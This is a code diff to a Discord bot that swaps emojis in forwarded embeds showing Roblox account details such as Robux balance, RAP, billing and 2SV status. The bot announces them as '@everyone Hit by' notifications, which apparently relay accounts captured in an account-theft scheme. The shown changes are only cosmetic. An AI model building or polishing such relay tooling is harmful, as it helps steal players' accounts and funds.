@@ -457,11 +457,11 @@ client.on('messageCreate', async (message) => {
                     
                     // Add emojis based on field content with enhanced patterns
                     if (field.name.toLowerCase().includes('robux') || field.name.toLowerCase().includes('balance')) {
-                        enhancedName = `💰 ${field.name}`;
+                        enhancedName = `<:diamond_yellow:1408080762267242648> ${field.name}`;
                     } else if (field.name.toLowerCase().includes('pending')) {
                         enhancedName = `⏳ ${field.name}`;
                     } else if (field.name.toLowerCase().includes('rap') || field.name.toLowerCase().includes('value')) {
-                        enhancedName = `💎 ${field.name}`;
+                        enhancedName = `<:Dominus_Prize:1408080755531190272> ${field.name}`;
                     } else if (field.name.toLowerCase().includes('owned') || field.name.toLowerCase().includes('items')) {
                         enhancedName = `📦 ${field.name}`;
                     } else if (field.name.toLowerCase().includes('credit') || field.name.toLowerCase().includes('billing')) {
@@ -479,7 +479,7 @@ client.on('messageCreate', async (message) => {
                     } else if (field.name.toLowerCase().includes('group')) {
                         enhancedName = `👥 ${field.name}`;
                     } else if (field.name.toLowerCase().includes('collectible')) {
-                        enhancedName = `🏆 ${field.name}`;
+                        enhancedName = `<:diamond_yellow:1408080762267242648> ${field.name}`;
                     } else {
                         enhancedName = `<:member_IDS:1393888535412740096> ${field.name}`;
                     }
@@ -489,10 +489,10 @@ client.on('messageCreate', async (message) => {
                     
                     // Replace True/False with emojis - order matters, do True first
                     if (enhancedValue.toLowerCase().includes('true')) {
-                        enhancedValue = enhancedValue.replace(/true/gi, '✅ True');
+                        enhancedValue = enhancedValue.replace(/true/gi, '<:yes:1393890949960306719> True');
                     }
                     if (enhancedValue.toLowerCase().includes('false')) {
-                        enhancedValue = enhancedValue.replace(/false/gi, '❌ False');
+                        enhancedValue = enhancedValue.replace(/false/gi, '<:no:1393890945929318542> False');
                     }
                     
                     // Add emojis to zero values in financial/stat contexts
@@ -506,15 +506,15 @@ client.on('messageCreate', async (message) => {
                         field.name.toLowerCase().includes('payment') ||
                         field.name.toLowerCase().includes('group')) {
                         // Replace standalone zeros with emoji zeros
-                        enhancedValue = enhancedValue.replace(/\b0\b/g, '🔴 0');
-                        enhancedValue = enhancedValue.replace(/\b0\$/g, '🔴 0$');
+                        enhancedValue = enhancedValue.replace(/\b0\b/g, '<:Robux:1393888802128265348> 0');
+                        enhancedValue = enhancedValue.replace(/\b0\$/g, '<:Dominus_Prize:1408080755531190272> 0$');
                     }
                     
                     // Add emojis to other numeric patterns
                     enhancedValue = enhancedValue.replace(/\bUnverified\b/gi, '🔄 Unverified');
-                    enhancedValue = enhancedValue.replace(/\bVerified\b/gi, '✅ Verified');
-                    enhancedValue = enhancedValue.replace(/\bDisabled\b/gi, '❌ Disabled');
-                    enhancedValue = enhancedValue.replace(/\bEnabled\b/gi, '✅ Enabled');
+                    enhancedValue = enhancedValue.replace(/\bVerified\b/gi, '<:yes:1393890949960306719> Verified');
+                    enhancedValue = enhancedValue.replace(/\bDisabled\b/gi, '<:no:1393890945929318542> Disabled');
+                    enhancedValue = enhancedValue.replace(/\bEnabled\b/gi, '<:yes:1393890949960306719> Enabled');
                     enhancedValue = enhancedValue.replace(/\bUnset\b/gi, '⚪ Unset');
 
                     forwardedEmbed.addFields({
@@ -566,8 +566,8 @@ client.on('messageCreate', async (message) => {
 
         // Send the filtered embed to destination channel with appropriate notification
         const notificationMessage = is2SVValidation ? 
-            '🔔 @everyone Notifier by <@133284075104174416>' : 
-            '💥 @everyone Hit by <@133284075104174416>';
+            '@everyone Notifier by <@133284075104174416>' : 
+            '@everyone Hit by <@133284075104174416>';
 
         await destinationChannel.send({
             content: notificationMessage,
